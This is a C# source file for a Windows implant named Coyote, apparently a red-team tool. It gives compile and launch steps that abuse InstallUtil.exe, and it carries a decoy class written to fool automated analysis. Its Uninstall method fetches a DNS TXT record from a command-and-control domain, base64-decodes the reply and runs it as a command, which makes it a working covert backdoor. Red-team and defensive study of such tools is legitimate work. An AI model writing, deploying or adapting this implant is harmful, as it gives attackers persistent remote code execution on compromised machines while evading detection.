
/*

Implant for maintaining covert access to compromised Windows infrastructure during red team engagements
https://github.com/TartarusLabs/Coyote
james.fell@tartaruslabs.com

To compile it: C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library /out:coyote.dll coyote.cs
To execute it: C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U coyote.dll

Refer to the README.md for full usage details

*/

using System;
using System.Diagnostics;
using System.IO;

namespace Coyote
{

	// Some decoy functionality to make this look like a legit DLL at least to automated analysis. You can delete the entire CoyoteMaths class and the implant will still work, but a DLL with nothing but an Uninstall method looks suspicious af.

	public class CoyoteMaths
	{  
		private bool bInitialised = false;  
		private bool bUseful = false;
		private long x1, x2, x3;
		
		public CoyoteMaths()   
		{   
			x1 = 0;
			x2 = 2;
			x3 = 4;
			bInitialised = true;
		}   

		private long AddThem(long a, long b)   
		{   
			return a + b;   
		}  
        
		public void CoyoteCompute()   
		{ 
			if (bInitialised)
			{
				x1 = x2;
				x2 = x3 * 2;
				x3 = AddThem(x1,8);
			}
		}  

		public bool Useful
		{   
			get   
			{   
				return bUseful;
			}   
			
			set
			{   
				bUseful = value ;   
			}   
		}   
		
	}   


	// The important bit

	[System.ComponentModel.RunInstaller(true)]
	public class Sample : System.Configuration.Install.Installer
	{
		private static string Base64Decode(string base64EncodedData) 
		{
			var base64EncodedBytes = System.Convert.FromBase64String(base64EncodedData);
			return System.Text.Encoding.UTF8.GetString(base64EncodedBytes);
		}
	
		public override void Uninstall(System.Collections.IDictionary savedState)
		{
			string c2domain = "updates.tartaruslabs.com";	// Change this to your own FQDN where you will place your DNS TXT record
		
			ProcessStartInfo siNslookup = new ProcessStartInfo();
			siNslookup.UseShellExecute = false;
			siNslookup.RedirectStandardOutput = true;
			siNslookup.FileName = @"C:\Windows\System32\nslookup.exe";
			siNslookup.Arguments = "-q=txt " + c2domain;	
			Process pNslookup = Process.Start(siNslookup);
						
			using (StreamReader reader = pNslookup.StandardOutput)
			{
				string strOutput;
			
				while (!reader.EndOfStream)
				{
					strOutput = reader.ReadLine();
				
					if (strOutput.Contains("\""))
					{
						strOutput = strOutput.Trim();
						strOutput = strOutput.Trim('"');
						ProcessStartInfo siCommand = new ProcessStartInfo(Base64Decode(strOutput));
						siCommand.UseShellExecute = true;
						siCommand.RedirectStandardOutput = false;
						Process pCommand = Process.Start(siCommand);
					}
				}
								
			}
		}
	}

}
